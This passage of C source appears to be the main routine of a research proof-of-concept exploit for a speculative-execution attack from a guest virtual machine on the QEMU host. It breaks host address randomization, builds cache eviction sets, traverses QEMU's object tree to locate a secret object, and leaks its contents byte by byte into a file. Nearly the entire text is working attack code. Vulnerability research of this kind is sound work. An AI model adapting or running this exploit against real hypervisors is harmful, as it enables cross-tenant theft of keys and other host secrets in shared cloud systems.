    uarf_jita_allocate(&jita_train_rax_leak, &stub_train_rax_leak,
                       HVA_DST_RAX_LEAK + aslr_offset);
    uarf_jita_allocate(&jita_train_rb_find, &stub_train_rb_find,
                       HVA_DST_RB_FIND + aslr_offset);

    uint64_t entry_offset = ((uint64_t) psnip_src_entry_label) - psnip_src.addr;

    actxt_t ctxt = {
        .entry_point = stub_src.addr + entry_offset,
        .stage_2_addr = stub_train_stage_2.addr,
        .victim_call_src = HVA_SRC + aslr_offset,
#ifndef NO_MMIO
        .mmio = mmio,
#endif
    };

// check aslr
#ifdef DEBUG_HIT
    UARF_LOG_INFO("Check Hit\n");
#endif
    dst_ptr[1] = _ul(stub_victim_dst.addr);
    dst_ptr[2] = 0;
    rb_reset();
    for (size_t i = 0; i < ROUNDS; i++) {
        trigger_ibpb();

#ifndef NO_MMIO
        mmio[0] = 0;
#endif

        rb_flush();
        uarf_mfence();

        // Value gets passed to RDX register of victim branch
        uint8_t *reload_ptr = _ptr(RB_PTR + RB_OFFSET + RB_ENTRY * RB_STRIDE);
        asm volatile("victim_label:\n"
                     "call *%3\n\t"
                     :
                     : "a"(dst_ptr), "b"(0), "d"(reload_ptr), "r"(ctxt.entry_point)
                     : "r8", "memory");

        for (volatile size_t i = 0; i < 10000; i++) {
        }
        rb_reload();
    }

    size_t maxi = rb_max_index(rb_hist, RB_SLOTS - 1);
#ifdef DEBUG_HIT
    printf("rb: %s, [%lu]: %lu\n", gen_rb_heat(), maxi, rb_hist[maxi]);
#endif
    if (maxi != RB_ENTRY || rb_hist[RB_ENTRY] < ROUNDS / 2) {
        UARF_LOG_ERROR("Not hitting it right\n");
        return 1;
    }
#ifdef DEBUG_HIT
    UARF_LOG_INFO("Hit OK\n");
    fflush(stdout);
#endif

    // search for the reload buffer
    dst_ptr[1] = _ul(stub_train_rb_find.addr);
    uint64_t rb_hva = 0;
    printf("\n");
    printf("### search reload buffer ###");
    fflush(stdout);
    clock_t start_rb = clock();
    uint64_t rb_hva_test = 0x700000000000ul;
    if (aslr_offset == 0) {
        rb_hva_test = 0x7ffd00000000ul;
    }
    if (rb_hint) {
        rb_hva_test = rb_hint - 0x100000000ul;
    }
    for (; rb_hva_test < 0x800000000000ul; rb_hva_test += PAGE_2M) {
        if ((rb_hva_test) % ((1 << 10) * PAGE_1G) == 0) {
            printf("\nsearch at 0x%012lx: ", rb_hva_test);
            fflush(stdout);
        }
        if ((rb_hva_test) % ((1 << 5) * PAGE_1G) == 0) {
            printf(".");
            fflush(stdout);
        }
        if (attack_loop(&ctxt, RB_INITIAL_ROUNDS, 0, 0, rb_hva_test + RB_OFFSET, RB_ENTRY,
                        1) &&
            attack_loop(&ctxt, ROUNDS, 1, 0, rb_hva_test + RB_OFFSET, RB_ENTRY, 1)) {
            rb_hva = rb_hva_test;
            printf("\nbuffer at 0x%012lx", rb_hva);
            break;
        }
    }
    printf("\n");

    if (!rb_hva) {
        UARF_LOG_ERROR("Error getting rb_hva\n");
        return 1;
    }
    ctxt.rb_hva = rb_hva;
    clock_t end_rb = clock();
#ifndef DEMO
    printf("rb_aslr time = %fs\n", ((double) (end_rb - start_rb)) / CLOCKS_PER_SEC);
    fflush(stdout);
#endif

#ifdef MARCH_ZEN5
    clock_t start_aslr_2 = clock();
    dst_ptr[1] = _ul(stub_train_rax_leak.addr);
    printf("\n");
    printf("### finish victim search on Zen 5 ###");
    int64_t found_extra_offset = -1;
    for (int64_t extra_offset = 0; extra_offset < (1UL << 45);
         extra_offset += (1UL << 24)) {
        uint64_t victim_guess = ctxt.victim_call_src + extra_offset;
        if ((extra_offset) % ((1 << 20) * PAGE_2M) == 0) {
            printf("\nsearch at 0x%012lx: ", victim_guess);
            fflush(stdout);
        }
        if ((extra_offset) % ((1 << 14) * PAGE_2M * 2) == 0) {
            printf(".");
            fflush(stdout);
        }
        if (attack_loop(&ctxt, ROUNDS, 1, 0,
                        rb_hva + RB_ENTRY * RB_STRIDE + RB_OFFSET -
                            (victim_guess + 0x116f35f) - 0x10,
                        RB_ENTRY, 1)) {
            printf("\nvictim found at 0x%012lx", victim_guess);
            found_extra_offset = extra_offset;
            break;
        }
    }
    printf("\n");
    if (found_extra_offset < 0) {
        UARF_LOG_ERROR("Failed to find victim extra offset\n");
        return 1;
    }

    // we need to relocate the source and training gadgets
    uarf_jita_deallocate(&jita_src, &stub_src);
    uarf_jita_deallocate(&jita_train_stage_1, &stub_train_stage_1);
    uarf_jita_deallocate(&jita_train_stage_2, &stub_train_stage_2);

    aslr_offset += found_extra_offset;
    uarf_jita_allocate(&jita_src, &stub_src, _ul(HVA_SRC - call_offset + aslr_offset));
    uarf_jita_allocate(&jita_train_stage_1, &stub_train_stage_1,
                       HVA_DST_STAGE_1 + aslr_offset);
    uarf_jita_allocate(&jita_train_stage_2, &stub_train_stage_2,
                       HVA_DST_STAGE_2 + aslr_offset);

    ctxt.entry_point = stub_src.addr + entry_offset;
    ctxt.stage_2_addr = stub_train_stage_2.addr;
    ctxt.victim_call_src = HVA_SRC + aslr_offset;
    trigger_ibpb(); // make sure that we clean the slate before going on
    clock_t end_aslr_2 = clock();

#ifdef MARCH_ZEN5
    code_aslr_time += ((double) (end_aslr_2 - start_aslr_2)) / CLOCKS_PER_SEC;
    printf("code_aslr time = %fs\n", code_aslr_time);
#endif
#endif

    dst_ptr[1] = _ul(stub_train_stage_1.addr);
    dst_ptr[2] = _ul(stub_train_stage_2.addr);
    printf("\n");
    printf("### L3 eviction sets ###\n");
    volatile uint64_t *(*l2_sets)[L2_1GB_SET_SIZE] =
        calloc(L2_SETS * L2_1GB_SET_SIZE, sizeof(l2_sets[0][0]));
    clock_t start_l3 = clock();
    uint64_t baseline = EVICTION_BASELINE;
    printf("build: ");
    if (!build_l2_sets(_ul(mem), MEM_SIZE, baseline, l2_sets)) {
        UARF_LOG_ERROR("Failed to build L3 eviction sets!\n");
        return 1;
    }

    clock_t end_l3 = clock();
#ifndef DEMO
    printf("l3_build time = %fs\n", ((double) (end_l3 - start_l3)) / CLOCKS_PER_SEC);
    fflush(stdout);
#endif

    clock_t start_search = clock();
    volatile uint64_t **best_eviction_set = NULL;
    uint64_t best_eviction_set_size = SIZE_MAX;
    for (int i = 0; i < 8 && best_eviction_set_size > L3_SET_SIZE; ++i) {
        for (int l2_set = 0; l2_set < L2_SETS; ++l2_set) {
            ctxt.eviction_set = &l2_sets[l2_set][0];
            ctxt.eviction_set_size = L2_1GB_SET_SIZE;
            if (check_good_l3set(&ctxt, ROUNDS, 0) ||
                check_good_l3set(&ctxt, ROUNDS, 0)) {
                printf("optimizing set: %d\n", l2_set);
#ifdef REDUCE_L3
                // can we reduce the LLC eviction set?
                volatile uint64_t *l3_wip_1[L2_1GB_SET_SIZE];
                volatile uint64_t *l3_wip_2[L2_1GB_SET_SIZE];
                volatile uint64_t **l3_wip = l3_wip_1;
                volatile uint64_t **l3_replace = l3_wip_2;

                // start with the full big L2 set
                uint64_t set_size = L2_1GB_SET_SIZE;
                memcpy(l3_wip, &l2_sets[l2_set][0],
                       L2_1GB_SET_SIZE * sizeof(l3_wip_1[0]));

                // try to reduce the set
                uint64_t reducer = REDUCE_CHUNK;
                for (int retries = 0; retries < 8 && set_size > L3_SET_SIZE; ++retries) {
                    for (int remove_index = 0;
                         remove_index < set_size && set_size > L3_SET_SIZE;
                         remove_index += reducer) {
                        // first, remove an element from the set
                        set_remove(l3_replace, l3_wip, set_size, remove_index);
                        for (int i = 1; i < reducer; ++i) {
                            set_remove(l3_replace, l3_replace, set_size - i,
                                       remove_index);
                        }

                        // check if we still have L3 eviction
                        ctxt.eviction_set = l3_replace;
                        ctxt.eviction_set_size = set_size - reducer;
                        if (check_good_l3set(&ctxt, 2 * ROUNDS, 3 * ROUNDS / 4) &&
                            check_good_l3set(&ctxt, 2 * ROUNDS, 3 * ROUNDS / 4)) {
                            // we still have eviction so the removal was ok. apply it.
                            volatile uint64_t **tmp = l3_wip;
                            l3_wip = l3_replace;
                            l3_replace = tmp;
                            set_size -= reducer;
                            remove_index -= reducer;
                            if (set_size == 128) {
                                reducer = 1;
                            }
                        }
                    }
                }
                printf("reached set size: %ld\n", set_size);
                if (set_size < best_eviction_set_size) {
                    best_eviction_set = l3_wip;
                    best_eviction_set_size = set_size;
                }
#else
                best_eviction_set = ctxt.eviction_set;
                best_eviction_set_size = ctxt.eviction_set_size;
                break;
#endif
            }
        }
    }
    if (!best_eviction_set) {
        UARF_LOG_ERROR("Eviction set not found!\n");
        return 1;
    }
    printf("final eviction set size: %ld\n", best_eviction_set_size);
#ifdef REDUCE_L3
    if (best_eviction_set_size > L3_SET_SIZE) {
        UARF_LOG_WARNING("Failed to find effective set\n");
    }
#endif
    ctxt.eviction_set = best_eviction_set;
    ctxt.eviction_set_size = best_eviction_set_size;

    clock_t end_search = clock();
#ifndef DEMO
    printf("l3_search time = %fs\n",
           ((double) (end_search - start_search)) / CLOCKS_PER_SEC);
    fflush(stdout);
#endif

#ifdef DEBUG_LEAK
    {
        uint64_t secret_ptr_hva = rb_hva;
        uint64_t secret_ptr_gva = RB_PTR;
        printf("leak bytes for secret=0-256:\n");
        int success = 0;
        int kinda_success = 0;
        for (uint8_t s = 0; s < 256; ++s) {
            *(volatile uint8_t *) (secret_ptr_gva) = s;
            uarf_mfence();

            uint8_t res;
            if (!leak_byte(&ctxt, secret_ptr_hva, &res))
                printf("failed\n");
            if (res == s) {
                success += 1;
            }
            else {
                if (res >> 3 == s >> 3) {
                    printf("small-bad: %d - %d\n", s, res);
                    kinda_success += 1;
                }
                else {
                    printf("big-bad: %d - %d\n", s, res);
                }
            }
            printf("s: %d - %u (%s)\n", s, res, s == res ? "ok" : "BAD");
            if (s == 255)
                break;
        }
        printf("success count = %d\n", success);
        printf("kinda_success count = %d\n", kinda_success);
        fflush(stdout);
        return 0;
    }
#endif
    // 1. get root object pointer $root (0x5eabae986040)
    // 2. get root_table pointer at $root + 0x10 (0x5eabae986050) $root_table
    // (0x5eabae98de50 points to hash table)
    // 3. get root hash table size at $root_table + 0x0 (0x5eabae98de50, 4-byte)
    // 4. get root hash table key pointer $root_table + 0x20 (0x5eabae98de70)
    // 5. get root hash table value pointer $root_table + 0x30 (0x5eabae98de80)
    // 6. get the object key pointers behind the key pointer, just consecutive, each
    // 8-bytes
    // 7. get the value pointer behind the object values pointer, same but pointer to a
    // property that then has the opaque pointer at the 9-th position so offset 0x40

    clock_t start_secret_search = clock();

    printf("\n");
    printf("### find qemu objects ###\n");
    uint64_t obj_root_ptr;
    if (!leak_pointer_reliably(&ctxt, QEMU_OBJECTMAYHEM_STATIC + aslr_offset,
                               &obj_root_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve obj_root_ptr\n");
        return 1;
    }
    printf("root = 0x%012lx\n", obj_root_ptr);

    uint64_t objects_ptr;
    if (!resolve_object(&ctxt, obj_root_ptr, &objects_ptr, QEMU_MAGIC_ROOT_OBJECT,
                        "root")) {
        UARF_LOG_ERROR("Failed to resolve first level of objects\n");
        return 1;
    }
    printf("objects = 0x%012lx\n", objects_ptr);

    printf("\n");
    printf("### find qemu secret object ###\n");

    uint64_t secret_object_ptr;
    if (!resolve_object(&ctxt, objects_ptr, &secret_object_ptr, QEMU_MAGIC_SECRET_OBJECT,
                        "objects")) {
        UARF_LOG_ERROR("Failed to resolve second level of objects\n");
        return 1;
    }
    printf("secret_object = 0x%012lx\n", secret_object_ptr);

    printf("\n");
    printf("### parse secret object ###\n");

    // try to get the data pointer from the object
    uint64_t rawlen_ptr = secret_object_ptr + 0x30;
    uint64_t rawlen;
    if (!leak_pointer_reliably(&ctxt, rawlen_ptr, &rawlen)) {
        UARF_LOG_ERROR("Failed to retrieve rawlen\n");
        return 1;
    }
    printf("secret length: %ld\n", rawlen);

    uint64_t rawdata_ptr_ptr = secret_object_ptr + 0x28;
    uint64_t rawdata_ptr;
    if (!leak_pointer_reliably(&ctxt, rawdata_ptr_ptr, &rawdata_ptr)) {
        UARF_LOG_ERROR("Failed to retrieve rawdata_ptr\n");
        return 1;
    }
    printf("secret pointer: 0x%012lx\n", rawdata_ptr);
    clock_t end_secret_search = clock();
#ifndef DEMO
    printf("secret_search time = %fs\n",
           ((double) (end_secret_search - start_secret_search)) / CLOCKS_PER_SEC);
#endif

    // leak the actual data

    FILE *f = fopen("./secret.txt", "w+");
    if (!f) {
        UARF_LOG_ERROR("Failed to open output file\n");
        return 1;
    }

    printf("\n");
    printf("### leak the raw data ###\n");
    fflush(stdout);
    uint8_t *leaked_secret = malloc(rawlen);
    if (!leaked_secret) {
        UARF_LOG_ERROR("Failed to allocate secret leak array\n");
        return 1;
    }
    clock_t start_leak_array = clock();
    for (uint64_t secret_offset = 0; secret_offset < rawlen; ++secret_offset) {
        uint64_t secret_ptr = rawdata_ptr + secret_offset;
        uint8_t res = leak_byte(&ctxt, secret_ptr, &leaked_secret[secret_offset]);
        if (res) {
            uint8_t byte = leaked_secret[secret_offset];
            if (isprint(byte) && byte < 127)
                printf("%c", byte);
            else
                printf("@");
            fprintf(f, "%c", byte);
        }
        else {
            printf("?");
            fprintf(f, "?");
        }
        fflush(stdout);
        fflush(f);
        if (secret_offset % 64 == 63) {
            printf("\n");
        }
    }
    printf("\n");
    fflush(stdout);
    fflush(f);
    fclose(f);
    clock_t end_leak_array = clock();
#ifndef DEMO
    printf("leak_array time = %fs\n",
           ((double) (end_leak_array - start_leak_array)) / CLOCKS_PER_SEC);
    fflush(stdout);
#endif

    munmap(mem, PAGE_1G);
    munmap((void *) RB_PTR, RB_SZ);

    return 0;
}
